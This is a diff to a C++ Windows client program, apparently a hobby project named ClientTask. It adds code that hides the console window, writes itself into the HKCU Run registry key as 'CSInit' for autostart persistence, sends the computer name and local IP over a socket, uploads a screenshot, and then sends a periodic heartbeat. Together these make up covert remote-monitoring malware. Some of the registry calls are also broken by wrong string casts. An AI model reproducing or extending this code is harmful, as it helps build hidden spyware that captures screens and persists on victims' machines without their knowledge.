@@ -151,12 +151,12 @@ bool SendScreenshot(SOCKET sock) {
 	streamsize size = file.seekg(0, ios::end).tellg();
 	file.seekg(0, std::ios::beg);
 
-	string size_str = to_string(size);
+	string size_str = "sizePic:" + to_string(size);
 	SendData(sock, size_str);
 
 	char buffer[1024];
 	while (file.read(buffer, sizeof(buffer))) {
-		SendData(sock, string(buffer, sizeof(buffer)));
+		SendData(sock, "screenshot:" + string(buffer, sizeof(buffer)));
 	}
 
 	file.close();
@@ -165,11 +165,28 @@ bool SendScreenshot(SOCKET sock) {
 }
 
 void SilentRun() {
-
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
 }
 
-void BackgroundRun() {
+void Autoload() {
+	const char* my_path = "D:\\ProgrammingProjects\\ClientTask\\x64\\Debug\\ClientTask.exe";
+	HKEY hKey;
+	RegCreateKeyEx(HKEY_CURRENT_USER,
+		(LPCWSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		NULL,
+		(LPWSTR)"",
+		REG_OPTION_NON_VOLATILE,
+		KEY_ALL_ACCESS,
+		NULL,
+		&hKey,
+		NULL);
 
+	if (hKey)
+	{
+		RegSetValueEx(hKey, (LPCWSTR)"CSInit", NULL, REG_SZ, (PBYTE)my_path, lstrlenW((LPCWSTR)my_path));
+		RegCloseKey(hKey);
+	}
 }
 
 
@@ -199,13 +216,17 @@ int main(int argc, char* argv[]) {
 	}
 	
 
-	string user_data = "user: machine:" + GetComputerName() + ";ip:" + GetLocalIp();
-	SendData(Connection, user_data);
+	string user_machine = "machine:" + GetComputerName();
+	string user_ip = "ip:" + GetLocalIp();
+	string blank = "";
+	SendData(Connection, user_machine);
+	SendData(Connection, user_ip);
+	SendData(Connection, blank);
 
 	SendScreenshot(Connection);
 
 	while (true) {
-		Sleep(10000);
+		Sleep(60000);
 		SendData(Connection, "heartbeat");
 	}
 
